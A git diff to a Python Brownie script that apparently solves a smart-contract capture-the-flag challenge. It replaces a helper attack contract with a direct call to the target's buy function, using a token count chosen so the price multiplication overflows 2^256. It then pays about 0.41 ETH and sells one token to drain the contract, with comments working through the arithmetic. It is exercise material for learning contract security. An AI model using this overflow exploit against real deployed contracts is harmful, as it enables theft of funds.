@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-from brownie import web3, Attack
+from brownie import web3
 from scripts.deploy import deploy
 from scripts.helpful_scripts import get_account
 from colorama import Fore
@@ -29,9 +29,24 @@ def hack(contract_address=None, attacker=None):
 
     print_colour(target.isComplete())
 
-    attacking_contract = Attack.deploy(target.address, {"from": attacker})
+    # * msg.value == numTokens * PRICE_PER_TOKEN
+    # * 2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458
+    # * (2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH
 
-    attacking_contract.pwn({"from": attacker, "value": "1 ether"}).wait(1)
+    target.buy(
+        115792089237316195423570985008687907853269984665640564039458,
+        {"from": attacker, "value": 415992086870360064},
+    ).wait(1)
+
+    print(
+        f"{magenta}Attacker Balance: {red}{web3.fromWei(attacker.balance(), 'ether')}{reset}"
+    )
+
+    target.sell(1, {"from": attacker}).wait(1)
+
+    print(
+        f"{green}Attacker Balance: {red}{web3.fromWei(attacker.balance(), 'ether')}{reset}"
+    )
 
     print_colour(target.isComplete())
 
@@ -39,7 +54,10 @@ def hack(contract_address=None, attacker=None):
 
 
 def main(contract_address=None):
-    hack()
+    if contract_address:
+        hack(contract_address, get_account())
+    else:
+        hack()
 
 
 if __name__ == "__main__":
